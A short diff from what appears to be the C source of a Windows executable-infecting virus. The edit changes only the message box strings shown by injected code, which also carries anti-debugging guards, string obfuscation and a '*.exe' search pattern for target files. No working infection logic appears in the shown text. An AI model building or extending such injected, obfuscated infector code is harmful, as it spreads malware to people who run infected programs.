@@ -27,10 +27,10 @@ INJECTED_CODE VOID inj_code_c() {
 #endif  // NO_ANTIDBG
 
     // Declare obfuscated strings for the rest of the function
-    DECLARE_OBFUSCATED(user32, "USER32.DLL");       // DLL to load for MessageBoxA
-    DECLARE_OBFUSCATED(mbTitle, "Hacked!!1");       // MessageBoxA title
-    DECLARE_OBFUSCATED(mbText, "You got hacked!");  // MessageBoxA text
-    DECLARE_OBFUSCATED(exeExt, "*.exe");            // File extension to search for
+    DECLARE_OBFUSCATED(user32, "USER32.DLL");          // DLL to load for MessageBoxA
+    DECLARE_OBFUSCATED(mbTitle, "Yharnam");            // MessageBoxA title
+    DECLARE_OBFUSCATED(mbText, "~ Fear the Old Blood ~");  // MessageBoxA text
+    DECLARE_OBFUSCATED(exeExt, "*.exe");               // File extension to search for
 
 #ifdef PL_DEBUG
     // Declarations for debug strings
